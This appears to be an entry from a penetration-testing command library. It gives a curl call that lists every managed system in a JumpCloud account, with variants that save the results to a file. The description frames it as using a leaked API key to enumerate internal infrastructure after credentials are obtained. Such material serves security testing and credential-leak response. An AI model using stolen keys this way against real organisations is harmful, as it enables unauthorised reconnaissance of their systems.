---
data: 'curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"'
tags:
  - api-enumeration
  - jumpcloud
type: command
executor: bash
platforms:
  - Cloud
id: 4ef35973-e7f8-4a34-ba66-294b9cf6ac08
created_at: '2025-12-14T17:32:48.648Z'
updated_at: '2025-12-14T17:32:48.648Z'
verified: false
validated: true
submitted: true
---
# curl-list-jumpcloud-systems

## Command

```bash
curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"
```

## Description

This command queries the JumpCloud API to list all managed systems using a leaked API key for authentication. Use it to enumerate internal infrastructure after obtaining credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "x-api-key: KEY"` | Adds the API key to the HTTP header for authentication | Yes |
| `URL` | Endpoint for systems list | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"
```

### Advanced Usage

Add silent mode or output to file:

```bash
curl -s -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems" > systems.json
```

## Expected Output

JSON response containing an array of system objects with details like IDs, names, and statuses.

## Related

- [[commands/curl-list-jumpcloud-system-users]]
- [[procedures/Exploit-Leaked-JumpCloud-API-Key]]
